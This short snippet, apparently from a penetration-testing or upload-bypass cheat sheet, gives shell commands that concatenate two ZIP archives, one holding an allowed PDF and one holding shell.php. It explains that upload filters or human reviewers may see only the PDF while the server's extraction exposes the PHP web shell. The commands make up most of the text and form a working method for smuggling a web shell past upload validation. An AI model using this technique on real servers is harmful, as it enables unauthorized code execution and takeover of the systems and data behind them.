- Concate 2 zip files.


---

## Concate 2 zip file
```
> ls
malicious test.pdf

\malicious > ls
shell.php

> zip head.zip test.pdf
> zip -r tail.zip malicious
> cat head.zip tail.zip > main.zip
```

That produces a single file that many upload checks (or human inspectors) will treat as _a single ZIP containing an allowed PDF_, while extraction or the server’s real ZIP parser may end up exposing the PHP shell.